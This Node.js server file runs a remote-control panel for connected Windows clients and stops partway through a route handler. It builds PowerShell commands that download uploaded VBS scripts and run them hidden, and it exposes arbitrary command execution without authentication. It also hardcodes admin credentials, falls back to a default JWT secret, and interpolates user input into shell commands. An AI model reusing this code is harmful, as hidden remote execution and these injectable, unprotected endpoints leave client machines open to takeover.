const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const fs = require('fs');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const csvParser = require('csv-parser');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Multer configuration for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, 'uploads/');
  },
  filename: (req, file, cb) => {
    const uniqueName = `${Date.now()}-${file.originalname}`;
    cb(null, uniqueName);
  }
});

const upload = multer({
  storage: storage,
  fileFilter: (req, file, cb) => {
    if (file.mimetype === 'audio/wav' || file.originalname.toLowerCase().endsWith('.wav')) {
      cb(null, true);
    } else {
      cb(new Error('Only .wav files are allowed'));
    }
  },
  limits: { fileSize: 50 * 1024 * 1024 } // 50MB limit
});

const uploadVbs = multer({
  storage: storage,
  fileFilter: (req, file, cb) => {
    if (file.originalname.toLowerCase().endsWith('.vbs')) {
      cb(null, true);
    } else {
      cb(new Error('Only .vbs files are allowed'));
    }
  },
  limits: { fileSize: 10 * 1024 * 1024 } // 10MB limit
});

const uploadVideo = multer({
  storage: storage,
  fileFilter: (req, file, cb) => {
    const ext = file.originalname.toLowerCase();
    if (ext.endsWith('.mp4') || ext.endsWith('.avi') || ext.endsWith('.mkv') || ext.endsWith('.webm')) {
      cb(null, true);
    } else {
      cb(new Error('Only video files are allowed (.mp4, .avi, .mkv, .webm)'));
    }
  },
  limits: { fileSize: 500 * 1024 * 1024 } // 500MB limit
});

const uploadGeneral = multer({
  storage: storage,
  fileFilter: (req, file, cb) => {
    // Allow all file types
    cb(null, true);
  },
  limits: { fileSize: 500 * 1024 * 1024 } // 500MB limit
});

const uploadPhoto = multer({
  storage: storage,
  fileFilter: (req, file, cb) => {
    const ext = file.originalname.toLowerCase();
    if (ext.match(/\.(jpg|jpeg|png|gif|bmp|webp)$/)) {
      cb(null, true);
    } else {
      cb(new Error('Only image files are allowed'));
    }
  },
  limits: { fileSize: 50 * 1024 * 1024 } // 50MB limit
});

// Load configuration
const config = JSON.parse(fs.readFileSync(path.join(__dirname, 'config.json'), 'utf8'));
const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-change-this-in-production';

// Middleware
app.use(cors({
  origin: true,
  credentials: true
}));
app.use(express.json());
app.use(cookieParser());
app.use(express.static('public'));
app.use('/uploads', express.static('uploads'));
app.use('/ecommerce', express.static('ecommerce'));
app.use(express.static('Website/website'));

// User management utilities
const USERS_FILE = path.join(__dirname, 'data', 'users.csv');
const SESSIONS_FILE = path.join(__dirname, 'data', 'sessions.json');

// Ensure data directory exists
if (!fs.existsSync(path.join(__dirname, 'data'))) {
  fs.mkdirSync(path.join(__dirname, 'data'));
}

// Purchase requests file
const MESSAGES_FILE = path.join(__dirname, 'data', 'msg.json');

// Initialize messages file if it doesn't exist
if (!fs.existsSync(MESSAGES_FILE)) {
  fs.writeFileSync(MESSAGES_FILE, JSON.stringify([], null, 2));
}

// Website settings file
const WEBSITE_SETTINGS_FILE = path.join(__dirname, 'data', 'website-settings.json');

// Initialize website settings file if it doesn't exist
if (!fs.existsSync(WEBSITE_SETTINGS_FILE)) {
  fs.writeFileSync(WEBSITE_SETTINGS_FILE, JSON.stringify({
    maintenanceMode: false,
    lastUpdated: new Date().toISOString()
  }, null, 2));
}

// Load website settings
function loadWebsiteSettings() {
  if (!fs.existsSync(WEBSITE_SETTINGS_FILE)) {
    return { maintenanceMode: false };
  }
  return JSON.parse(fs.readFileSync(WEBSITE_SETTINGS_FILE, 'utf8'));
}

// Save website settings
function saveWebsiteSettings(settings) {
  settings.lastUpdated = new Date().toISOString();
  fs.writeFileSync(WEBSITE_SETTINGS_FILE, JSON.stringify(settings, null, 2));
}

// Load users from CSV
function loadUsers() {
  return new Promise((resolve, reject) => {
    const users = [];
    if (!fs.existsSync(USERS_FILE)) {
      resolve(users);
      return;
    }
    fs.createReadStream(USERS_FILE)
      .pipe(csvParser())
      .on('data', (row) => users.push(row))
      .on('end', () => resolve(users))
      .on('error', reject);
  });
}

// Save users to CSV
function saveUsers(users) {
  const headers = 'username,password,displayName,createdAt,status\n';
  const rows = users.map(u => `${u.username},${u.password},${u.displayName},${u.createdAt},${u.status || 'enabled'}`).join('\n');
  fs.writeFileSync(USERS_FILE, headers + rows);
}

// Load sessions
function loadSessions() {
  if (!fs.existsSync(SESSIONS_FILE)) {
    return {};
  }
  return JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf8'));
}

// Save sessions
function saveSessions(sessions) {
  fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions, null, 2));
}

// Authentication middleware
function authenticate(req, res, next) {
  const token = req.cookies.authToken || req.headers.authorization?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ error: 'Authentication required' });
  }
  
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    return res.status(401).json({ error: 'Invalid or expired token' });
  }
}

// Admin authentication middleware
function authenticateAdmin(req, res, next) {
  const authHeader = req.headers['x-admin-auth'];
  
  if (!authHeader) {
    return res.status(401).json({ error: 'Admin authentication required' });
  }
  
  try {
    const decoded = Buffer.from(authHeader, 'base64').toString('utf-8');
    const [username, password] = decoded.split(':');
    
    // Hardcoded admin credentials
    if (username === 'kunal' && password === 'kunal6379') {
      next();
    } else {
      return res.status(401).json({ error: 'Invalid admin credentials' });
    }
  } catch (error) {
    return res.status(401).json({ error: 'Invalid admin credentials' });
  }
}

// Store connected clients
const connectedClients = new Map();

// Blocklist file
const BLOCKLIST_FILE = path.join(__dirname, 'data', 'blocklist.json');

// Initialize blocklist file if it doesn't exist
if (!fs.existsSync(BLOCKLIST_FILE)) {
  fs.writeFileSync(BLOCKLIST_FILE, JSON.stringify([], null, 2));
}

// Load blocklist
function loadBlocklist() {
  try {
    if (!fs.existsSync(BLOCKLIST_FILE)) {
      return [];
    }
    const data = fs.readFileSync(BLOCKLIST_FILE, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error('Error loading blocklist:', error);
    return [];
  }
}

// Save blocklist
function saveBlocklist(blocklist) {
  try {
    fs.writeFileSync(BLOCKLIST_FILE, JSON.stringify(blocklist, null, 2));
  } catch (error) {
    console.error('Error saving blocklist:', error);
  }
}

// Check if hostname is blocked
function isBlocked(hostname) {
  const blocklist = loadBlocklist();
  return blocklist.some(item => item.hostname.toLowerCase() === hostname.toLowerCase());
}

// Maintenance mode middleware
function checkMaintenanceMode(req, res, next) {
  const settings = loadWebsiteSettings();
  
  // Allow admin routes and API calls
  if (req.path.startsWith('/admin') || 
      req.path.startsWith('/api') || 
      req.path.startsWith('/dashboard') ||
      req.path.startsWith('/users') ||
      req.path.startsWith('/messages') ||
      req.path === '/maintenance') {
    return next();
  }
  
  // Show maintenance page if enabled
  if (settings.maintenanceMode) {
    return res.sendFile(path.join(__dirname, 'Website', 'website', 'maintenance.html'));
  }
  
  next();
}

// Website routes (will have maintenance check applied to each)
app.get('/', checkMaintenanceMode, (req, res) => {
  res.sendFile(path.join(__dirname, 'Website', 'website', 'index.html'));
});

app.get('/software', checkMaintenanceMode, (req, res) => {
  res.sendFile(path.join(__dirname, 'Website', 'website', 'software', 'index.html'));
});

app.get('/product', checkMaintenanceMode, (req, res) => {
  res.sendFile(path.join(__dirname, 'Website', 'website', 'product', 'index.html'));
});

app.get('/admin/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'Website', 'website', 'admin-login.html'));
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'Website', 'website', 'admin.html'));
});

app.get('/member/login', checkMaintenanceMode, (req, res) => {
  res.sendFile(path.join(__dirname, 'Website', 'website', 'member-login.html'));
});

app.get('/member/dashboard', checkMaintenanceMode, (req, res) => {
  res.sendFile(path.join(__dirname, 'Website', 'website', 'member-dashboard.html'));
});

// Dashboard routes (control panel)
app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Serve the user management page
app.get('/users', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'users.html'));
});

// Serve the messages admin page
app.get('/messages', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'messages.html'));
});

// Maintenance mode API endpoints
app.get('/api/maintenance-status', (req, res) => {
  try {
    const settings = loadWebsiteSettings();
    res.json({
      maintenanceMode: settings.maintenanceMode,
      lastUpdated: settings.lastUpdated
    });
  } catch (error) {
    console.error('Error reading maintenance status:', error);
    res.status(500).json({ error: 'Failed to read maintenance status' });
  }
});

app.post('/api/maintenance-mode', authenticateAdmin, (req, res) => {
  try {
    const { enabled } = req.body;
    
    if (typeof enabled !== 'boolean') {
      return res.status(400).json({ error: 'enabled must be a boolean' });
    }
    
    const settings = loadWebsiteSettings();
    settings.maintenanceMode = enabled;
    saveWebsiteSettings(settings);
    
    res.json({
      success: true,
      maintenanceMode: settings.maintenanceMode,
      message: enabled ? 'Maintenance mode enabled' : 'Maintenance mode disabled'
    });
  } catch (error) {
    console.error('Error updating maintenance mode:', error);
    res.status(500).json({ error: 'Failed to update maintenance mode' });
  }
});

// Purchase request endpoint
app.post('/api/purchase-request', (req, res) => {
  try {
    const purchaseData = req.body;
    
    // Read existing messages
    let messages = [];
    if (fs.existsSync(MESSAGES_FILE)) {
      const data = fs.readFileSync(MESSAGES_FILE, 'utf8');
      messages = JSON.parse(data);
    }
    
    // Add new message with ID
    const newMessage = {
      id: Date.now().toString(),
      ...purchaseData,
      status: 'pending',
      createdAt: new Date().toISOString()
    };
    
    messages.unshift(newMessage); // Add to beginning
    
    // Save to file
    fs.writeFileSync(MESSAGES_FILE, JSON.stringify(messages, null, 2));
    
    res.json({ success: true, message: 'Purchase request received' });
  } catch (error) {
    console.error('Error saving purchase request:', error);
    res.status(500).json({ success: false, error: 'Failed to save request' });
  }
});

// Get all purchase requests
app.get('/api/purchase-requests', authenticate, (req, res) => {
  try {
    if (fs.existsSync(MESSAGES_FILE)) {
      const data = fs.readFileSync(MESSAGES_FILE, 'utf8');
      const messages = JSON.parse(data);
      res.json(messages);
    } else {
      res.json([]);
    }
  } catch (error) {
    console.error('Error reading purchase requests:', error);
    res.status(500).json({ error: 'Failed to read requests' });
  }
});

// Update purchase request status
app.post('/api/purchase-requests/:id/status', authenticate, (req, res) => {
  try {
    const { id } = req.params;
    const { status } = req.body;
    
    if (fs.existsSync(MESSAGES_FILE)) {
      const data = fs.readFileSync(MESSAGES_FILE, 'utf8');
      let messages = JSON.parse(data);
      
      const index = messages.findIndex(m => m.id === id);
      if (index !== -1) {
        messages[index].status = status;
        messages[index].updatedAt = new Date().toISOString();
        
        fs.writeFileSync(MESSAGES_FILE, JSON.stringify(messages, null, 2));
        res.json({ success: true });
      } else {
        res.status(404).json({ error: 'Message not found' });
      }
    } else {
      res.status(404).json({ error: 'No messages found' });
    }
  } catch (error) {
    console.error('Error updating status:', error);
    res.status(500).json({ error: 'Failed to update status' });
  }
});

// Delete purchase request
app.delete('/api/purchase-requests/:id', authenticate, (req, res) => {
  try {
    const { id } = req.params;
    
    if (fs.existsSync(MESSAGES_FILE)) {
      const data = fs.readFileSync(MESSAGES_FILE, 'utf8');
      let messages = JSON.parse(data);
      
      messages = messages.filter(m => m.id !== id);
      
      fs.writeFileSync(MESSAGES_FILE, JSON.stringify(messages, null, 2));
      res.json({ success: true });
    } else {
      res.status(404).json({ error: 'No messages found' });
    }
  } catch (error) {
    console.error('Error deleting message:', error);
    res.status(500).json({ error: 'Failed to delete message' });
  }
});

// ========== Authentication API Routes ==========

// Get config (branding)
app.get('/api/config', (req, res) => {
  res.json(config);
});

// Login endpoint
app.post('/api/auth/login', async (req, res) => {
  try {
    const { username, password, rememberMe } = req.body;
    
    if (!username || !password) {
      return res.status(400).json({ error: 'Username and password required' });
    }
    
    const users = await loadUsers();
    const user = users.find(u => u.username === username);
    
    if (!user) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    // Check if user is disabled
    if (user.status === 'disabled') {
      return res.status(403).json({ error: 'Account has been disabled. Contact administrator.' });
    }
    
    const isValid = await bcrypt.compare(password, user.password);
    
    if (!isValid) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    // Generate JWT token
    const expiresIn = rememberMe ? '30d' : '24h';
    const token = jwt.sign(
      { username: user.username, displayName: user.displayName },
      JWT_SECRET,
      { expiresIn }
    );
    
    // Set cookie
    res.cookie('authToken', token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      maxAge: rememberMe ? 30 * 24 * 60 * 60 * 1000 : 24 * 60 * 60 * 1000
    });
    
    // Save session if remember me
    if (rememberMe) {
      const sessions = loadSessions();
      sessions[username] = {
        token,
        createdAt: new Date().toISOString(),
        expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString()
      };
      saveSessions(sessions);
    }
    
    res.json({
      success: true,
      user: {
        username: user.username,
        displayName: user.displayName
      },
      token
    });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ error: 'Login failed' });
  }
});

// Verify token endpoint
app.get('/api/auth/verify', authenticate, (req, res) => {
  res.json({
    valid: true,
    user: {
      username: req.user.username,
      displayName: req.user.displayName
    }
  });
});

// Logout endpoint
app.post('/api/auth/logout', (req, res) => {
  const { username } = req.body;
  
  if (username) {
    const sessions = loadSessions();
    delete sessions[username];
    saveSessions(sessions);
  }
  
  res.clearCookie('authToken');
  res.json({ success: true });
});

// Change password endpoint
app.post('/api/auth/change-password', authenticate, async (req, res) => {
  try {
    const { currentPassword, newPassword } = req.body;
    
    if (!currentPassword || !newPassword) {
      return res.status(400).json({ error: 'Both passwords required' });
    }
    
    const users = await loadUsers();
    const userIndex = users.findIndex(u => u.username === req.user.username);
    
    if (userIndex === -1) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    const isValid = await bcrypt.compare(currentPassword, users[userIndex].password);
    
    if (!isValid) {
      return res.status(401).json({ error: 'Current password is incorrect' });
    }
    
    users[userIndex].password = await bcrypt.hash(newPassword, 10);
    saveUsers(users);
    
    res.json({ success: true, message: 'Password changed successfully' });
  } catch (error) {
    console.error('Change password error:', error);
    res.status(500).json({ error: 'Failed to change password' });
  }
});

// ========== Admin User Management API Routes ==========

// Get all users
app.get('/api/admin/users', authenticateAdmin, async (req, res) => {
  try {
    const users = await loadUsers();
    // Don't send passwords to client
    const sanitizedUsers = users.map(u => ({
      username: u.username,
      displayName: u.displayName,
      createdAt: u.createdAt,
      status: u.status || 'enabled'
    }));
    res.json(sanitizedUsers);
  } catch (error) {
    console.error('Error loading users:', error);
    res.status(500).json({ error: 'Failed to load users' });
  }
});

// Add new user
app.post('/api/admin/users', authenticateAdmin, async (req, res) => {
  try {
    const { username, password, displayName } = req.body;
    
    if (!username || !password || !displayName) {
      return res.status(400).json({ error: 'Username, password, and display name are required' });
    }
    
    const users = await loadUsers();
    
    // Check if user already exists
    if (users.find(u => u.username === username)) {
      return res.status(400).json({ error: 'Username already exists' });
    }
    
    // Hash password
    const hashedPassword = await bcrypt.hash(password, 10);
    
    // Add new user
    const newUser = {
      username,
      password: hashedPassword,
      displayName,
      createdAt: new Date().toISOString(),
      status: 'enabled'
    };
    
    users.push(newUser);
    saveUsers(users);
    
    res.json({ message: 'User added successfully', username });
  } catch (error) {
    console.error('Error adding user:', error);
    res.status(500).json({ error: 'Failed to add user' });
  }
});

// Update user role
app.put('/api/admin/users/:username/role', authenticateAdmin, async (req, res) => {
  try {
    const { username } = req.params;
    const { displayName } = req.body;
    
    if (!displayName) {
      return res.status(400).json({ error: 'Display name is required' });
    }
    
    const users = await loadUsers();
    const userIndex = users.findIndex(u => u.username === username);
    
    if (userIndex === -1) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    users[userIndex].displayName = displayName;
    saveUsers(users);
    
    res.json({ message: 'User role updated successfully' });
  } catch (error) {
    console.error('Error updating user role:', error);
    res.status(500).json({ error: 'Failed to update user role' });
  }
});

// Reset user password
app.put('/api/admin/users/:username/password', authenticateAdmin, async (req, res) => {
  try {
    const { username } = req.params;
    const { password } = req.body;
    
    if (!password) {
      return res.status(400).json({ error: 'Password is required' });
    }
    
    const users = await loadUsers();
    const userIndex = users.findIndex(u => u.username === username);
    
    if (userIndex === -1) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    // Hash new password
    users[userIndex].password = await bcrypt.hash(password, 10);
    saveUsers(users);
    
    res.json({ message: 'Password reset successfully' });
  } catch (error) {
    console.error('Error resetting password:', error);
    res.status(500).json({ error: 'Failed to reset password' });
  }
});

// Enable/Disable user
app.put('/api/admin/users/:username/status', authenticateAdmin, async (req, res) => {
  try {
    const { username } = req.params;
    const { status } = req.body;
    
    if (!status || (status !== 'enabled' && status !== 'disabled')) {
      return res.status(400).json({ error: 'Status must be "enabled" or "disabled"' });
    }
    
    // Prevent disabling the main admin
    if (username === 'kunal') {
      return res.status(403).json({ error: 'Cannot disable main admin user' });
    }
    
    const users = await loadUsers();
    const userIndex = users.findIndex(u => u.username === username);
    
    if (userIndex === -1) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    users[userIndex].status = status;
    saveUsers(users);
    
    // If disabling, invalidate user's sessions and logout
    if (status === 'disabled') {
      const sessions = loadSessions();
      if (sessions[username]) {
        delete sessions[username];
        saveSessions(sessions);
      }
      
      // Notify all connected dashboards to logout this user
      io.emit('userDisabled', { username });
    }
    
    res.json({ message: `User ${status} successfully` });
  } catch (error) {
    console.error('Error updating user status:', error);
    res.status(500).json({ error: 'Failed to update user status' });
  }
});

// Delete user
app.delete('/api/admin/users/:username', authenticateAdmin, async (req, res) => {
  try {
    const { username } = req.params;
    
    // Prevent deleting the main admin
    if (username === 'kunal') {
      return res.status(403).json({ error: 'Cannot delete main admin user' });
    }
    
    const users = await loadUsers();
    const filteredUsers = users.filter(u => u.username !== username);
    
    if (filteredUsers.length === users.length) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    saveUsers(filteredUsers);
    
    // Invalidate user's sessions
    const sessions = loadSessions();
    if (sessions[username]) {
      delete sessions[username];
      saveSessions(sessions);
    }
    
    // Notify all connected dashboards to logout this user
    io.emit('userDeleted', { username });
    
    res.json({ message: 'User deleted successfully' });
  } catch (error) {
    console.error('Error deleting user:', error);
    res.status(500).json({ error: 'Failed to delete user' });
  }
});

// ========== Blocklist API Routes (Protected) ==========

// Get blocklist
app.get('/api/blocklist', authenticate, (req, res) => {
  try {
    const blocklist = loadBlocklist();
    res.json(blocklist);
  } catch (error) {
    console.error('Error reading blocklist:', error);
    res.status(500).json({ error: 'Failed to read blocklist' });
  }
});

// Add hostname to blocklist
app.post('/api/blocklist', authenticate, (req, res) => {
  try {
    const { hostname } = req.body;
    
    if (!hostname || typeof hostname !== 'string' || !hostname.trim()) {
      return res.status(400).json({ error: 'Valid hostname is required' });
    }
    
    const blocklist = loadBlocklist();
    
    // Check if already blocked
    if (blocklist.some(item => item.hostname.toLowerCase() === hostname.toLowerCase())) {
      return res.status(400).json({ error: 'Hostname already in blocklist' });
    }
    
    // Add to blocklist
    blocklist.push({
      hostname: hostname.trim(),
      addedAt: new Date().toISOString(),
      addedBy: req.user.username
    });
    
    saveBlocklist(blocklist);
    
    // Disconnect any currently connected client with this hostname
    for (const [clientId, client] of connectedClients.entries()) {
      if (client.hostname.toLowerCase() === hostname.toLowerCase() && client.connected) {
        client.socket.emit('blocked', { reason: 'Your computer has been blocked by the administrator' });
        client.socket.disconnect(true);
        client.connected = false;
      }
    }
    
    // Broadcast updated client list
    io.emit('clientsUpdated', Array.from(connectedClients.values()).map(client => ({
      id: client.id,
      hostname: client.hostname,
      ip: client.ip,
      connected: client.connected,
      lastSeen: client.lastSeen
    })));
    
    res.json({ message: 'Hostname added to blocklist successfully', hostname: hostname.trim() });
  } catch (error) {
    console.error('Error adding to blocklist:', error);
    res.status(500).json({ error: 'Failed to add to blocklist' });
  }
});

// Remove hostname from blocklist
app.delete('/api/blocklist/:hostname', authenticate, (req, res) => {
  try {
    const { hostname } = req.params;
    
    const blocklist = loadBlocklist();
    const initialLength = blocklist.length;
    const filteredBlocklist = blocklist.filter(item => item.hostname.toLowerCase() !== hostname.toLowerCase());
    
    if (filteredBlocklist.length === initialLength) {
      return res.status(404).json({ error: 'Hostname not found in blocklist' });
    }
    
    saveBlocklist(filteredBlocklist);
    res.json({ message: 'Hostname removed from blocklist successfully' });
  } catch (error) {
    console.error('Error removing from blocklist:', error);
    res.status(500).json({ error: 'Failed to remove from blocklist' });
  }
});

// ========== Client Management API Routes (Protected) ==========

app.get('/api/clients', authenticate, (req, res) => {
  const clients = Array.from(connectedClients.values()).map(client => ({
    id: client.id,
    hostname: client.hostname,
    ip: client.ip,
    connected: client.connected,
    lastSeen: client.lastSeen
  }));
  res.json(clients);
});

// Power management endpoints
app.post('/api/shutdown/:clientId', (req, res) => {
  const { clientId } = req.params;
  const { delay = 0 } = req.body;

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  client.socket.emit('shutdown', { delay });
  res.json({ message: `Shutdown command sent to ${client.hostname}` });
});

app.post('/api/reboot/:clientId', (req, res) => {
  const { clientId } = req.params;
  const { delay = 0 } = req.body;

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  client.socket.emit('reboot', { delay });
  res.json({ message: `Reboot command sent to ${client.hostname}` });
});

app.post('/api/cancel/:clientId', (req, res) => {
  const { clientId } = req.params;

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  client.socket.emit('cancel');
  res.json({ message: `Cancel command sent to ${client.hostname}` });
});

app.post('/api/broadcast', (req, res) => {
  const { message, clientIds } = req.body;

  if (!message) {
    return res.status(400).json({ error: 'Message is required' });
  }

  let targetClients = [];

  if (clientIds && clientIds.length > 0) {
    // Broadcast to specific clients
    targetClients = clientIds.map(id => connectedClients.get(id)).filter(Boolean);
  } else {
    // Broadcast to all connected clients
    targetClients = Array.from(connectedClients.values()).filter(client => client.connected);
  }

  targetClients.forEach(client => {
    client.socket.emit('broadcast', { message });
  });

  res.json({
    message: `Broadcast sent to ${targetClients.length} client(s)`,
    targets: targetClients.map(c => c.hostname)
  });
});

// Clear offline devices endpoint
app.post('/api/clear-offline', (req, res) => {
  const offlineClients = Array.from(connectedClients.values()).filter(client => !client.connected);
  const offlineCount = offlineClients.length;

  if (offlineCount === 0) {
    return res.json({ message: 'No offline devices to clear' });
  }

  // Remove offline clients from the map
  offlineClients.forEach(client => {
    connectedClients.delete(client.id);
  });

  // Broadcast updated client list to all dashboards
  io.emit('clientsUpdated', Array.from(connectedClients.values()).map(client => ({
    id: client.id,
    hostname: client.hostname,
    ip: client.ip,
    connected: client.connected,
    lastSeen: client.lastSeen
  })));

  res.json({
    message: `Successfully cleared ${offlineCount} offline device(s)`,
    clearedCount: offlineCount
  });
});

// Universal command execution endpoint
app.post('/api/execute/:clientId', (req, res) => {
  const { clientId } = req.params;
  const { command, timeout, workingDirectory } = req.body;

  if (!command) {
    return res.status(400).json({ error: 'Command is required' });
  }

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  const commandId = require('uuid').v4();
  
  client.socket.emit('executeCommand', {
    command,
    commandId,
    options: {
      timeout: timeout || 30000,
      workingDirectory: workingDirectory || null
    }
  });

  res.json({ 
    message: `Command sent to ${client.hostname}`,
    commandId: commandId
  });
});

// System information endpoint
app.get('/api/system-info/:clientId', (req, res) => {
  const { clientId } = req.params;

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  const requestId = require('uuid').v4();
  
  client.socket.emit('getSystemInfo', { requestId });

  res.json({ 
    message: `System info request sent to ${client.hostname}`,
    requestId: requestId
  });
});

// Process management endpoints
app.get('/api/processes/:clientId', (req, res) => {
  const { clientId } = req.params;

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  const requestId = require('uuid').v4();
  
  client.socket.emit('getProcessList', { requestId });

  res.json({ 
    message: `Process list request sent to ${client.hostname}`,
    requestId: requestId
  });
});

app.post('/api/kill-process/:clientId', (req, res) => {
  const { clientId } = req.params;
  const { processName, pid } = req.body;

  if (!processName && !pid) {
    return res.status(400).json({ error: 'Process name or PID is required' });
  }

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  const commandId = require('uuid').v4();
  
  client.socket.emit('killProcess', {
    processName,
    pid,
    commandId
  });

  res.json({ 
    message: `Kill process command sent to ${client.hostname}`,
    commandId: commandId
  });
});

// Get list of uploaded audio files
app.get('/api/audio-files', (req, res) => {
  try {
    const files = fs.readdirSync('uploads/')
      .filter(file => file.toLowerCase().endsWith('.wav'))
      .map(file => {
        const stats = fs.statSync(path.join('uploads', file));
        return {
          filename: file,
          size: stats.size,
          uploadedAt: stats.mtime
        };
      })
      .sort((a, b) => b.uploadedAt - a.uploadedAt); // newest first
    
    res.json(files);
  } catch (error) {
    res.status(500).json({ error: 'Failed to read audio files' });
  }
});

// Delete an audio file
app.delete('/api/audio-files/:filename', (req, res) => {
  const { filename } = req.params;
  const filePath = path.join('uploads', filename);
  
  try {
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
      res.json({ message: `File ${filename} deleted successfully` });
    } else {
      res.status(404).json({ error: 'File not found' });
    }
  } catch (error) {
    res.status(500).json({ error: 'Failed to delete file' });
  }
});

// Audio playback endpoint (upload new file)
app.post('/api/play-audio/:clientId', upload.single('audioFile'), (req, res) => {
  const { clientId } = req.params;

  if (!req.file) {
    return res.status(400).json({ error: 'No audio file uploaded' });
  }

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    // Clean up uploaded file
    fs.unlinkSync(req.file.path);
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  const commandId = uuidv4();
  const audioUrl = `http://${req.get('host')}/uploads/${req.file.filename}`;
  const filename = req.file.filename;
  
  // PowerShell command to check if file exists, download only if needed, then play audio
  const command = `powershell -Command "$audioDir = 'C:\\audios'; if (-not (Test-Path $audioDir)) { New-Item -ItemType Directory -Path $audioDir -Force | Out-Null }; $audioPath = Join-Path $audioDir '${filename}'; if (-not (Test-Path $audioPath)) { Invoke-WebRequest -Uri '${audioUrl}' -OutFile $audioPath }; $player = New-Object System.Media.SoundPlayer($audioPath); $player.PlaySync()"`;
  
  // Send command to client via existing executeCommand mechanism
  client.socket.emit('executeCommand', {
    command,
    commandId,
    options: {
      timeout: 60000,
      workingDirectory: null
    }
  });

  res.json({ 
    message: `Audio playback command sent to ${client.hostname}`,
    commandId: commandId,
    filename: req.file.originalname
  });
});

// Get list of uploaded VBS scripts
app.get('/api/vbs-files', (req, res) => {
  try {
    const files = fs.readdirSync('uploads/')
      .filter(file => file.toLowerCase().endsWith('.vbs'))
      .map(file => {
        const stats = fs.statSync(path.join('uploads', file));
        return {
          filename: file,
          size: stats.size,
          uploadedAt: stats.mtime
        };
      })
      .sort((a, b) => b.uploadedAt - a.uploadedAt);
    
    res.json(files);
  } catch (error) {
    res.status(500).json({ error: 'Failed to read VBS files' });
  }
});

// Delete a VBS script
app.delete('/api/vbs-files/:filename', (req, res) => {
  const { filename } = req.params;
  const filePath = path.join('uploads', filename);
  
  try {
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
      res.json({ message: `File ${filename} deleted successfully` });
    } else {
      res.status(404).json({ error: 'File not found' });
    }
  } catch (error) {
    res.status(500).json({ error: 'Failed to delete file' });
  }
});

// Execute VBS script endpoint (upload new file)
app.post('/api/execute-vbs/:clientId', uploadVbs.single('vbsFile'), (req, res) => {
  const { clientId } = req.params;

  if (!req.file) {
    return res.status(400).json({ error: 'No VBS file uploaded' });
  }

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    fs.unlinkSync(req.file.path);
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  const commandId = uuidv4();
  const vbsUrl = `http://${req.get('host')}/uploads/${req.file.filename}`;
  const filename = req.file.filename;
  
  // PowerShell command to check if file exists, download only if needed, then execute VBS script
  const command = `powershell -Command "$vbsDir = 'C:\\scripts'; if (-not (Test-Path $vbsDir)) { New-Item -ItemType Directory -Path $vbsDir -Force | Out-Null }; $vbsPath = Join-Path $vbsDir '${filename}'; if (-not (Test-Path $vbsPath)) { Invoke-WebRequest -Uri '${vbsUrl}' -OutFile $vbsPath }; Start-Process 'wscript.exe' -ArgumentList ('//B', $vbsPath) -WindowStyle Hidden"`;
  
  client.socket.emit('executeCommand', {
    command,
    commandId,
    options: {
      timeout: 60000,
      workingDirectory: null
    }
  });

  res.json({ 
    message: `VBS script execution command sent to ${client.hostname}`,
    commandId: commandId,
    filename: req.file.originalname
  });
});

// File Explorer - List directory contents
app.post('/api/list-directory/:clientId', (req, res) => {
  const { clientId } = req.params;
  const { path: dirPath } = req.body;

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  const requestId = uuidv4();
  
  // PowerShell command to list directory contents with details
  const command = `powershell -Command "Get-ChildItem -Path '${dirPath}' -Force | Select-Object Name, @{Name='Type';Expression={if($_.PSIsContainer){'Directory'}else{'File'}}}, Length, LastWriteTime | ConvertTo-Json -Compress"`;
  
  client.socket.emit('executeCommand', {
    command,
    commandId: requestId,
    options: {
      timeout: 30000,
      workingDirectory: null
    }
